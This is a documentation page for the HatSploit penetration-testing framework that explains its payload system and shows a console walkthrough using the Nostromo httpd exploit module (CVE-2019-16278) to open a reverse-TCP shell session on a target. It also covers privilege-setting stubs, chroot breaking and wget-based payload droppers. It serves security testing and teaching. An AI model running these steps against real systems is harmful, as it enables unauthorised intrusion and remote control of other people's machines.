---
layout: default
title: HatSploit Payloads
parent: Getting started
nav_order: 6
---

After the successful exploitation, *exploit* module should have something to send in order to get a remote shell or any other kind of impact. This is where payloads come in action. HatSploit provides an extensive interface for payload development and supports all kinds of them:

* *Shellcodes* - These payloads are highly architecture dependent due to that they are written in pure assembly. HatSploit enables payload authors to store payloads in assembly code rather then publishing compiled shellcodes.
* *Scripts / Commands* - These payloads can be any script, from BASH, Python or PowerShell code to a single command.

All payloads are different and are created for different purposes, however HatSploit has a strict payload system to distinguish them. There are two types of payload:

* *Stager* - Payload that is sent first and the main purpose of which is to read the next (bigger) payload into memory and execute it.
* *Single* - Payload that can be sent by itself or after the stager. This payload is flexible and can contain multiple ways it can be executed, while *stager* has only one.

## Using payloads

To use a specific payload, you should first select the module that supports payload execution. This can be any module that exploits any kind of remote code execution 
vulnerability from OS command injection to buffer overflows.

Let's take `exploit/linux/nostromo/remote_code_execution` module that exploits vulnerability in a nostromo server and attempts to gain OS command injection.

```entysec
[hsf3]> search nostromo

Modules:

    Number    Category    Module                                          Rank    Name
    0         exploit     exploit/linux/nostromo/remote_code_execution    high    Nostromo httpd Remote Code Execution

[hsf3]> use 0
[*] Using default payload linux/x64/pwny_reverse_tcp...
[hsf3: Nostromo httpd Remote Code Execution]> options

Module Options (exploit/linux/nostromo/remote_code_execution):

    Option     Value                         Required    Description
    HOST                                     yes         HTTP host.
    LHOST      10.0.2.2                      yes         Local host.
    LPORT      8888                          yes         Local port.
    PAYLOAD    linux/x64/pwny_reverse_tcp    yes         Payload to use.
    PORT       80                            yes         HTTP port.
    SSL        no                            no          Use SSL.
    TIMEOUT    10                            no          Connection timeout.


Payload Options (linux/x64/pwny_reverse_tcp):

    Option     Value           Required    Description
    ENCODER                    no          Encoder to use.
    RHOST      10.0.2.2        yes         Remote host.
    RPORT      8888            yes         Remote port.
```

As can be observed, we already have a payload preconfigured for us to use on an exploited system. You can invoke `info` command to find more information about the effects of the 
module.

```entysec
[hsf3: Nostromo httpd Remote Code Execution]> info

    Name: Nostromo httpd Remote Code Execution
  Module: exploit/linux/nostromo/remote_code_execution
Platform: linux
    Rank: high

Authors:
  Ivan Nikolskiy (enty8080) - module developer
  sp0re (sp0re) - vulnerability researcher

Description:
  Nostromo 1.9.6 webserver has a vulnerability leading to a remote code
  execution.

References:
  URL: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
  URL: https://nvd.nist.gov/vuln/detail/CVE-2019-16278
  URL: https://www.exploit-db.com/exploits/47837
  CVE: 2019-16278
  EDB: 47837

Stability:
  Module does not crash target

Reliability:
  Module spawns reliable session
```

Now we need to set our target and configure module to deliver payload.

{: .note }
Some modules have payload pre-configured (in this case its `linux/x64/pwny_reverse_tcp`) but it might not work in some specific cases so correct payload selection is important.

```entysec
[hsf3: Nostromo httpd Remote Code Execution]> set host 10.0.2.3
[i] host => 10.0.2.3
[hsf3: Nostromo httpd Remote Code Execution]> set port 8000
[i] port => 8000
[hsf3: Nostromo httpd Remote Code Execution]> set rhost 10.0.2.2
[i] rhost => 10.0.2.2
```

After we have verified that module is configured correctly we can execute it with `run` or `exploit`

```entysec
[hsf3: Nostromo httpd Remote Code Execution]> run

[*] Starting TCP listener on port 8888...
[*] Sending payload stage (208 bytes)...
[*] Establishing connection (10.0.2.3:54292 -> 0.0.0.0:8888)...
[*] Sending payload stage #0 (127 bytes)...
[*] Sending payload (634380 bytes)...
[+] Pwny session 0 opened at 2024-12-01 06:08:00 GMT!
[*] Interacting with session 0...


Pwny interactive shell v1.0.0
Running as daemon on /bin

Pwny Tip: Prepend command with ! to execute it locally

pwny:/bin daemon$
```

The fact that there was a session opened indicated that we successfully exploited the vulnerability. This session is powered with [Pwny](/docs/Pwny) which 
is a powerful and advanced payload.

```entysec
pwny:/bin daemon$ sysinfo

      cOKxc            Name: Linux
     .0K0kWc         Kernel: 2.6.32-5-amd64
     .x,':Nd           Time: 2024-12-01 06:09:48 UTC (UTC+0000)
    .l... ,Wk.       Vendor: Debian
   .0.     ,NN,        Arch: x86_64
  .K;       0N0      Memory: 97.34 MB/118.86 MB
 ..'cl.    'xO:        UUID: 3859fc34-68ed-4f52-87ed-eaf72a8f1310
 ,''';c'':Oc',,.
   ..'.  ..,,.
```

Now you can quit session and send it to background:

{: .note }
Use `quit` to send session to background or `exit` to terminate session.

```entysec
pwny:/bin daemon$ quit
[+] Exploit module completed!
[*] Terminating TCP listener on port 8888...
[hsf3: Nostromo httpd Remote Code Execution]> sessions -l

Opened Sessions:

    ID    Platform    Arch    Type    Host         Port    Time
    0     linux       x64     pwny    10.0.2.3     8888    2024-12-01 06:08:00 GMT
```

To learn how to manage sessions efficiently read our guide on session management - [Session Management](/docs/getting-started/session-management)

## Payload options

If you invoke `options` on module with payload configured you might notice that there are not only module options available but also option for payload. These options might 
include `RHOST` and `RPORT` if payload type is reverse TCP or `BPORT` if payload type is bind TCP. Some payloads might also include advanced options which can be seen by 
invoking `advanced` command. For example:

```entysec
[hsf3: Nostromo httpd Remote Code Execution]> advanced

Module Advanced Options (exploit/linux/nostromo/remote_code_execution):

    Option              Value    Required    Description
    HANDLER::DROPPER    wget     no          Method used to deliver payload.
    HANDLER::PSEUDO     no       no          Use pseudo shell instead of payload.


Payload Advanced Options (linux/x64/shell_reverse_tcp):

    Option                Value    Required    Description
    AppendExit            no       no          Append a stub that executes exit(0)
    BadChars              b''      no          Bad characters to omit.
    PrependChrootBreak    no       no          Prepend a stub that breaks chroot.
    PrependFork           no       no          Prepend a stub that executes fork().
    PrependSetgid         no       no          Prepend a stub that executes setgid(0).
    PrependSetregid       no       no          Prepend a stub that executes setregid(0, 0).
    PrependSetresgid      no       no          Prepend a stub that executes setresgid(0, 0, 0).
    PrependSetresuid      no       no          Prepend a stub that executes setresuid(0, 0, 0).
    PrependSetreuid       no       no          Prepend a stub that executes setreuid(0, 0).
    PrependSetuid         no       no          Prepend a stub that executes setuid(0).
    Staged                no       no          Send stage instead of whole payload.
```

Here is a breakdown of each option (this is not a full list since each payload has its own set of options):

* `AppendExit` - Appends a stub that executes `exit(0)`.
* `BadChars` - Bad characters to omit when generating payload.
* `PrependChrootBreak` - Prepends a stub that breaks chroot.
* `PrependFork` - Prepends a stub that executes `fork()`.
* `PrependSetgid` - Prepends a stub that executes `setgid(0)`.
* `PrependSetregid` - Prepends a stub that executes `setregid(0, 0)`.
* `PrependSetresgid` - Prepends a stub that executes `setresgid(0, 0, 0)`.
* `PrependSetresuid` - Prepends a stub that executes `setresuid(0, 0, 0)`.
* `PrependSetreuid` - Prepends a stub that executes `setreuid(0, 0)`.
* `PrependSetuid` - Prepends a stub that executes `setreuid(0, 0)`.
* `Staged` - Sends stage instead of whole payload.

Options that have names that start with `HANDLER::` are used to configure payload handler that sends payload and handles connection (if payload requires it).

Some of these options might include `HANDLER::DROPPER` that specifies the method of uploading payload on a remote filesystem (if payload needs to be uploaded on disk instead of loaded 
directly to memory) or `HANDLER::PSEUDO` that forces handler to talk with target via blind command injection instead of sending payload.

Some modules exploit flaws that lead to remote command execution on OS level and in this case payload (or stager) should be either executed as a command (if it's a command 
payload) or uploaded on a disk and then executed. In case if upload is essential, `HANDLER::DROPPER` defines the method of writing payload to disk. Some of these methods 
include `echo` which segments payload into small blocks and uses file streams in current shell to write them separately to a file, `printf` that does pretty much the same thing 
or `wget` that stores payload on an HTTP server and then uses `wget` command to retrieve this payload for server and execute it.

## Developing the payload

If you want to contribute and develop your own payload, you might find this guide useful - [Writing Payloads](/docs/development/writing-payloads)
